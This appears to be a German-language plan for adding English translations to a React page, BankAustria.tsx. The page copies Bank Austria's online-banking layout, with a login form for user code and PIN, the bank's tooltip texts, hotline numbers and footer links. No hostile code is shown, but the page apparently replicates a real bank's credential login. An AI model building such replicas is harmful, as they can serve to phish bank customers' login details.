

## Englische Übersetzung basierend auf `activeLang`

### Ansatz
Ein Übersetzungs-Objekt (`translations`) mit `de`/`en`-Keys anlegen und alle Texte darüber steuern. `activeLang` State existiert bereits.

### Änderungen in `src/pages/BankAustria.tsx`

**1. Translations-Objekt (oben, nach den Imports):**
```ts
const translations = {
  de: {
    nav: ["Privatkunden", "Firmenkunden", "Private Banking", "Über uns"],
    sidebar: ["GIROKONTEN", "KREDITKARTEN", "SPARPRODUKTE", "FINANZIERUNG", "WERTPAPIERE", "BÖRSEN &\nMÄRKTE"],
    verfuegerPlaceholder: "Verfügernummer",
    pinPlaceholder: "PIN",
    pinForgot: "PIN vergessen oder Verfügernummer gesperrt?",
    tooltipVerfueger: "Die Verfügernummer ist eine von zwei notwendigen Komponenten für den Login. Sie ist eine Kombination aus bis zu 8 Ziffern.",
    tooltipPin: "Die PIN ist die zweite für den Login notwendige Komponente. Die initiale PIN wird von der Bank Austria definiert und kann von Ihnen, nach dem ersten Login, geändert werden.",
    footerIcons: ["Sicherheits\ninformationen", "Sicherheitscenter\n+43 (0) 50505 26105", "Internetbanking Hotline\n+43 (0) 50505 26100", "FAQ", "Cookie Policy"],
    footerLinks: ["Impressum", "AGB", "Datenschutzerklärung"],
  },
  en: {
    nav: ["Private", "Business", "Private Banking", "About us"],
    sidebar: ["CURRENT ACCOUNTS", "CREDIT CARDS", "SAVINGS", "FINANCING", "SECURITIES", "MARKET\nINFO"],
    verfuegerPlaceholder: "User Code",
    pinPlaceholder: "PIN",
    pinForgot: "Did you forget your PIN or is your user code locked?",
    tooltipVerfueger: "The user code is one of two necessary components for the login. It is a combination of 8 figures maximum.",
    tooltipPin: "The PIN is the second necessary component for the login. The initial PIN is defined by Bank Austria and can be changed by you after the first login.",
    footerIcons: ["Security\nInformation", "Security center\n+43 (0) 50505 26105", "Online banking hotline\n+43 (0) 50505 26100", "FAQ", "Cookie Policy"],
    footerLinks: ["Imprint", "Terms & Conditions", "Privacy"],
  }
};
```

**2. navItems und sidebarItems — Labels dynamisch aus `translations[activeLang]`**
- Die Arrays behalten Icons/Hrefs, aber Labels werden per Index aus dem Translations-Objekt gelesen

**3. Promo-Banner + Disclaimer ausblenden bei EN:**
- Die Promo-Banner-Sektion (Zeilen 270-298) wird in `{activeLang === "de" && (...)}` gewrappt
- Damit verschwindet sowohl das Bild als auch der Disclaimer-Text

**4. Login-Form Texte:**
- Placeholder Verfügernummer → `translations[activeLang].verfuegerPlaceholder`
- Placeholder PIN → bleibt "PIN"
- Link-Text → `translations[activeLang].pinForgot`
- Tooltip-Texte → aus Translations

**5. Footer-Icons Labels:**
- Labels aus `translations[activeLang].footerIcons[index]`

**6. Footer-Links:**
- Impressum/AGB/Datenschutzerklärung → Imprint/Terms & Conditions/Privacy aus `translations[activeLang].footerLinks`

### Datei
- `src/pages/BankAustria.tsx`

